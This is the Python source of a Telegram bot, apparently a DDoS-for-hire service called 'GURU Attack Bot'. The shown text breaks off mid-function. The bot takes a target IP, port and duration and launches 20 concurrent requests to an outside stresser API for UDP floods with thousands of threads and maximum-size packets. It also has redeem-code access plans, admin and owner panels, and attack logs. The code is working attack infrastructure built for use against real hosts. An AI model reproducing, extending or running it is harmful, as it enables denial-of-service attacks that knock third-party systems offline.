# app.py - Complete Bot with All Features (API-Only UDP) - FIXED
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
import random
import string
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20
MAX_QUEUE = 50

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 GURU Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        try:
            if mongo_uri:
                self.client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
                self.client.admin.command('ping')
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                
                for admin_id in [OWNER_ID, PSEUDO_OWNER_ID]:
                    if not self.admins.find_one({"user_id": admin_id}):
                        level = "owner" if admin_id == OWNER_ID else "pseudo_owner"
                        self.admins.insert_one({
                            "user_id": admin_id,
                            "level": level,
                            "added_at": datetime.now()
                        })
                logger.info("✅ MongoDB connected")
            else:
                raise Exception("No MongoDB URI")
        except Exception as e:
            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory")
            self.memory_mode = True
            self.users = {}
            self.codes = {}
            self.logs = []
            self.admins = {
                OWNER_ID: {"user_id": OWNER_ID, "level": "owner"},
                PSEUDO_OWNER_ID: {"user_id": PSEUDO_OWNER_ID, "level": "pseudo_owner"}
            }
    
    def add_user(self, user_id, username=None, first_name=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "username": username, 
                    "first_name": first_name, 
                    "last_active": datetime.now(),
                    "plan": "premium",
                    "plan_expiry": datetime.now() + timedelta(days=30),
                    "has_used_code": False
                }},
                upsert=True
            )
        else:
            if user_id not in self.users:
                self.users[user_id] = {
                    "user_id": user_id, 
                    "username": username, 
                    "first_name": first_name,
                    "plan": "premium",
                    "plan_expiry": datetime.now() + timedelta(days=30)
                }
    
    def get_user(self, user_id):
        if not self.memory_mode:
            return self.users.find_one({"user_id": user_id})
        return self.users.get(user_id)
    
    def get_user_plan(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return "premium", datetime.now() + timedelta(days=30)
        
        plan = user.get("plan", "premium")
        expiry = user.get("plan_expiry")
        
        if not expiry:
            expiry = datetime.now() + timedelta(days=30)
            self.update_user_plan(user_id, "premium", expiry)
        
        if expiry and isinstance(expiry, datetime):
            if expiry < datetime.now():
                expiry = datetime.now() + timedelta(days=30)
                self.update_user_plan(user_id, "premium", expiry)
        
        return plan, expiry
    
    def update_user_plan(self, user_id, plan, expiry):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"plan": plan, "plan_expiry": expiry}}
            )
        else:
            if user_id in self.users:
                self.users[user_id]["plan"] = plan
                self.users[user_id]["plan_expiry"] = expiry
    
    def get_user_stats(self, user_id):
        if not self.memory_mode:
            return self.logs.count_documents({"user_id": user_id})
        else:
            return len([l for l in self.logs if l.get("user_id") == user_id])
    
    def get_total_attacks(self):
        if not self.memory_mode:
            return self.logs.count_documents({})
        return len(self.logs)
    
    def is_admin(self, user_id):
        if not self.memory_mode:
            return self.admins.find_one({"user_id": user_id}) is not None
        return user_id in self.admins
    
    def get_admin_level(self, user_id):
        if not self.memory_mode:
            admin = self.admins.find_one({"user_id": user_id})
            return admin.get("level") if admin else None
        return self.admins.get(user_id, {}).get("level")
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, added_by):
        if not self.memory_mode:
            if self.admins.find_one({"user_id": user_id}):
                return False
            self.admins.insert_one({
                "user_id": user_id,
                "username": username,
                "level": "admin",
                "added_by": added_by,
                "added_at": datetime.now()
            })
            return True
        else:
            if user_id in self.admins:
                return False
            self.admins[user_id] = {"user_id": user_id, "level": "admin"}
            return True
    
    def remove_admin(self, user_id):
        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
            return False
        if not self.memory_mode:
            result = self.admins.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        else:
            if user_id in self.admins:
                del self.admins[user_id]
                return True
        return False
    
    def get_admins(self):
        if not self.memory_mode:
            return list(self.admins.find({}))
        return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = True
    
    def unban_user(self, user_id):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": False, "ban_reason": None}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = False
    
    def is_banned(self, user_id):
        user = self.get_user(user_id)
        return user.get("is_banned", False) if user else False
    
    def create_code(self, code, days, created_by):
        if not self.memory_mode:
            if self.codes.find_one({"code": code}):
                return False
            self.codes.insert_one({
                "code": code,
                "access_days": days,
                "created_by": created_by,
                "created_at": datetime.now(),
                "used_by": None,
                "used_at": None,
                "is_used": False
            })
            return True
        else:
            if code in self.codes:
                return False
            self.codes[code] = {
                "code": code,
                "access_days": days,
                "created_at": datetime.now(),
                "is_used": False
            }
            return True
    
    def use_code(self, code, user_id):
        if not self.memory_mode:
            code_data = self.codes.find_one({"code": code, "is_used": False})
            if code_data:
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"has_used_code": True, "code_used": code}}
                )
                return code_data
        else:
            if code in self.codes and not self.codes[code]["is_used"]:
                code_data = self.codes[code]
                code_data["is_used"] = True
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                if user_id in self.users:
                    self.users[user_id]["has_used_code"] = True
                return code_data
        return None
    
    def get_codes(self, only_unused=False):
        if not self.memory_mode:
            query = {"is_used": False} if only_unused else {}
            return list(self.codes.find(query).sort("created_at", -1))
        else:
            codes = list(self.codes.values())
            if only_unused:
                codes = [c for c in codes if not c["is_used"]]
            return codes
    
    def delete_code(self, code):
        if not self.memory_mode:
            result = self.codes.delete_one({"code": code})
            return result.deleted_count > 0
        else:
            if code in self.codes:
                del self.codes[code]
                return True
        return False
    
    def log_attack(self, user_id, target, port, duration, method, status, concurrent_count=20, response=None):
        log = {
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "status": status,
            "concurrent": concurrent_count,
            "response": response[:500] if response else None,
            "timestamp": datetime.now()
        }
        if not self.memory_mode:
            self.logs.insert_one(log)
        else:
            self.logs.append(log)
        
        user = self.get_user(user_id)
        username = user.get("username") if user else None
        first_name = user.get("first_name") if user else None
        return {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "concurrent": concurrent_count
        }
    
    def get_all_users(self):
        if not self.memory_mode:
            return list(self.users.find({}))
        return list(self.users.values())

db = Database(MONGO_URI)

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
            if len(self.active_attacks) >= 100:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== API-ONLY UDP ATTACK (NO FALLBACK) =====
async def send_udp_api(target, port, duration, attack_num):
    """API-ONLY UDP attack - No fallback"""
    base_url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try multiple methods
    methods = ["udp", "telegramvc"]
    
    for method in methods:
        params = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method,
            "threads": 5000,
            "pps": 5000000,
            "size": 65500
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                
                # Try GET first
                async with session.get(base_url, params=params, headers=headers) as response:
                    elapsed = time.time() - start_time
                    raw_response = await response.read()
                    try:
                        result_text = raw_response.decode('utf-8')
                    except:
                        result_text = raw_response.decode('utf-8', errors='ignore')
                    
                    # Check for success indicators
                    success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
                    is_success = any(indicator in result_text for indicator in success_indicators)
                    
                    if response.status == 200:
                        return {
                            "success": True,
                            "attack_num": attack_num,
                            "method": "API_GET",
                            "status": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:300],
                            "full_response": result_text
                        }
                        
        except Exception as e:
            logger.error(f"Attack {attack_num} with method {method} failed: {e}")
            continue
    
    return {
        "success": False,
        "attack_num": attack_num,
        "method": "API_FAILED",
        "error": "All API methods failed"
    }

# ===== 20 CONCURRENT ATTACKS (API-ONLY) =====
async def send_20_concurrent_attacks(target, port, duration):
    """Launch 20 concurrent API-only UDP attacks"""
    logger.info(f"🚀 Launching 20 concurrent API attacks on {target}:{port}")
    
    tasks = []
    for i in range(1, 21):
        task = send_udp_api(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    
    stats = attack_manager.get_stats()
    total_attacks = db.get_user_stats(user.id)
    is_admin = db.is_admin(user.id)
    
    plan, expiry = db.get_user_plan(user.id)
    plan_display = "💎 PREMIUM"
    if expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display += f" ({days_left}d left)"
    
    first_name = user.first_name or "User"
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ 20x UDP Concurrent: ENABLED\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user.id) else '❌ BANNED'}"
    )
    
    keyboard = []
    if not db.is_banned(user.id):
        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if db.is_owner_or_pseudo(user.id):
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    if not is_admin:
        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

# ===== ATTACK COMMAND =====
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        return
    
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Only admins can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.13.41 32000 60`\n\n"
            "⚡ 20 concurrent UDP attacks!\n"
            "📦 Packet Size: 65,500 bytes\n"
            "💪 Threads: 5,000 each\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *20x UDP ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"📦 Packet: `65,500 bytes`",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        # Log the attack using db.log_attack
        attack_info = db.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            result.get('successful', 0),
            str(result)
        )
        
        if result.get('success'):
            response_text = (
                f"✅ *20x UDP ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📦 Packet: `65,500 bytes`\n"
                f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
            )
            
            if result.get('results'):
                response_text += f"📊 *Attack Results:*\n"
                success_count = 0
                for r in result['results'][:10]:
                    status = "✅" if r.get('success') else "❌"
                    if r.get('success'):
                        success_count += 1
                    method_used = r.get('method', 'N/A')
                    status_code = r.get('status', 'N/A')
                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: {method_used} - {status_code}\n"
                
                if len(result['results']) > 10:
                    response_text += f"... and {len(result['results']) - 10} more\n"
                
                response_text += f"\n📊 Success Rate: {success_count}/{len(result['results'])}"
        else:
            response_text = (
                f"❌ *20x UDP ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ===== BUTTON ATTACK =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if db.is_banned(query.from_user.id):
        await query.edit_message_text("❌ You are banned!")
        return
    
    await query.edit_message_text(
        "💥 *20x UDP ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.41 32000 60`\n\n"
        "⚡ 20 concurrent UDP attacks!\n"
        "📦 Packet Size: 65,500 bytes\n"
        "💪 Threads: 5,000 each\n"
        "⏱️ Time: 60-300 seconds\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        context.user_data['awaiting_attack'] = False
        return
    
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Only admins can attack!")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Launching 20 UDP attacks on {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        # Log the attack
        db.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            result.get('successful', 0),
            str(result)
        )
        
        if result.get('success'):
            response_text = (
                f"✅ *20x UDP SUCCESS!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

# ===== MY PLAN =====
async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    days_left = max(0, (expiry - datetime.now()).days) if expiry else 30
    
    text = (
        "👤 *MY PLAN*\n\n"
        "📊 Plan: 💎 PREMIUM\n"
        f"⏱️ Remaining: {days_left} days\n"
        f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'N/A'}\n\n"
        "📌 Features:\n"
        "• Full access\n"
        "• 20x UDP Concurrent\n"
        "• Unlimited attacks"
    )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== INFO =====
async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    level = db.get_admin_level(user_id) or "USER"
    plan, expiry = db.get_user_plan(user_id)
    total_attacks = db.get_user_stats(user_id)
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: {user_id}\n"
        f"⭐ Level: {level.upper()}\n"
        f"📊 Plan: PREMIUM\n"
        f"⚡ 20x UDP: ENABLED\n"
        f"💥 Total Attacks: {total_attacks}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== STATS =====
async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    total_attacks = db.get_total_attacks()
    users = db.get_all_users()
    admins = db.get_admins()
    codes = db.get_codes()
    active = len(attack_manager.active_attacks)
    
    stats_text = (
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Total Users: {len(users)}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Total Attacks: {total_attacks}\n"
        f"🎫 Redeem Codes: {len(codes)}\n"
        f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
        f"⚡ 20x UDP: ENABLED\n"
        f"🌐 Status: ONLINE"
    )
    
    await query.edit_message_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

# ===== ADMIN PANEL =====
async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 90 DAYS", callback_data="gen_90d")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    days = int(query.data.split('_')[1].replace('d', ''))
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {days} days\n\n"
            f"Share this code with users!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:20]:
            status = "✅" if not c.get('is_used') else f"❌ Used by {c.get('used_by', 'N/A')}"
            text += f"`{c['code']}` - {c['access_days']}d - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text("No unused codes to delete!")
        return
    
    keyboard = []
    for c in codes[:10]:
        keyboard.append([InlineKeyboardButton(f"❌ {c['code']}", callback_data=f"del_{c['code']}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE CODE*\n\nSelect code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.split('_')[1]
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

# ===== OWNER PANEL =====
async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("🛑 KILL SWITCH", callback_data="owner_kill")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        f"👑 *OWNER PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not db.is_owner_or_pseudo(query.from_user.id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    for aid in list(attack_manager.active_attacks.keys()):
        attack_manager.stop_attack(aid)
    
    await query.edit_message_text(
        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
        f"✅ All active attacks stopped\n"
        f"⚡ System cleared!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
        return
    
    for aid in list(attack_manager.active_attacks.keys()):
        attack_manager.stop_attack(aid)
    
    await update.message.reply_text(
        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
        f"✅ All active attacks stopped\n"
        f"⚡ System cleared!",
        parse_mode='Markdown'
    )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 *PROMOTE ADMIN*\n\nSend user ID to promote:\n`123456789`\n\nSend /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        username = user.get('username', 'Unknown') if user else 'Unknown'
        
        if db.add_admin(user_id, username, update.effective_user.id):
            await update.message.reply_text(f"✅ User `{user_id}` is now an admin!", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ User is already an admin!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    for admin in admins:
        if admin['user_id'] not in [OWNER_ID, PSEUDO_OWNER_ID]:
